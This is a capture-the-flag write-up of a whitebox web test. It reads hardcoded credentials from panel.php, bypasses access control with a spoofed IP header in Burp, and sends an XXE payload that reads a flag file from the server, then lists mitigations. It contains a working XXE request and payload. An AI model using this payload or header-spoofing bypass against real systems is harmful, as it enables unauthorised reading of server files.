## WhiteBox Penetration Test – Internal Web Application

This challenge demonstrates the XML external entity vulnerability that allows an attacker to interfere with an application's processing of XML data.

Challenge Credit: Devnull X ZedBounty

### Scenario

### Tools Used
- Burp Suite
- Curl
- Mozilla Firefox
- XML Payloads (Payloadallthings)
- DomDocument analysis

**Environment**
![Screenshot_2025-05-05_13_36_35](https://github.com/user-attachments/assets/f062c120-325b-47f0-ab35-82652efe44c7)

 
 **Configuration Files (zip file)**
  
![Screenshot_2025-05-05_15_46_47](https://github.com/user-attachments/assets/da670ee4-741d-49c0-84b1-d591dfbbd262)


  *Panel.php is an interesting file*


### Key Findings
**1. Access Control bypass**

Upon trying to access panel.php on the live web server our access was denied. 

Something already smells vulnerable.....lol

![Screenshot_2025-05-05_15_56_47](https://github.com/user-attachments/assets/3be39ff4-0084-47eb-b2a5-064c451f87ef)

  
- Hardcoded credentials discovered via *panel.php* file.....bullseye!
  
  
  ![cred](https://github.com/user-attachments/assets/0e8ee05e-73ec-4911-9893-8ba698b11f81)

- Lets take out the big guns now......Burpsuite!
  
    --> Intercept request with proxy
  
    --> Insert credentials and spoofed IP in HTTP Header.
  
    --> forward request

  
  ![Screenshot_2025-05-05_14_46_34](https://github.com/user-attachments/assets/878e17fb-3584-49c0-b823-fd9ab6d8b948)
  

  - Panel.php is now accessible
    
    ![Screenshot_2025-05-05_14_12_23](https://github.com/user-attachments/assets/992309f8-18b6-4d8f-baff-757cc84638d8)
    

    *......Sweeeeet!*

**2. Vulnerability Discovery (XXE)**

XML external entity injection (also known as XXE) is a web security vulnerability that allows an attacker to interfere with an application's processing of XML data. - Portswigger

Whats basically happening is the server is able to recieve external data (In the form of XML) and processes this data without proper handling hence the parser expands the input and reveals files on the server.

Classification: XML External Entity (XXE) Injection

Impact: High/severe 

 --> Send request to Burp repeater

 --> Change method from GET to POST

 --> Content type to application/xml

 --> Insert test payload in message body


![Screenshot_2025-05-05_14_24_41](https://github.com/user-attachments/assets/2139a878-a07a-4ecf-9284-3390de2de149)

 *DomDocument::loadXML() is an interesting find*

 **4. Exploit**
 
 The panel.php endpoint accepts XML input via POST with the header Content-Type: application/xml. 
 
 --> Open Burp Repeater

 --> Change the request method GET to POST

POST /panel.php?username=v1v4c3ll4dm1n&password=v1va_la_v1da@123 HTTP/1.1
 
Host: challenge.zedbounty.com

X-VIVACELL-VPN: 41.18.611.104

Content-Type: application/xml

Connection: close

--> Paste the payload in the message body

```xml &lt;?
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "file:///flag.txt">
]>
<data>
    <health>&xxe;</health>
    <temperature>420</temperature>
    <pressure>1337</pressure>
    <control_rods>Lowered</control_rods>
    <radiation_level>5.4</radiation_level>
    <coolant_level>87</coolant_level>
    <power_input>900</power_input>
    <emergency_shutdown>false</emergency_shutdown>
</data>
```
---> How it was sent in Burp

![Screenshot_2025-05-06_14_21_15](https://github.com/user-attachments/assets/e4936b49-0fe0-4a9a-b891-45a23315f087)


--> Check The response tab

*Viola.......Flag Captured: **ZB{xx3_ch3mic4l_r3act1on}***


### Mitigation
- Validate or sanitize incoming XML payloads.

- Disable entity Loading.

- Restrict LIBXML_NOENT usage.

### Lessons Learned
- Bypassing directory access controls using HTTP Header requests
  
- DOMDocument::loadXML() parser when used with LIBXML_NOENT can expose sensitive files on the web server

- IP Spoofing to bypass authentication with hardcoded credentials

### Thank you for reaching thus far.....
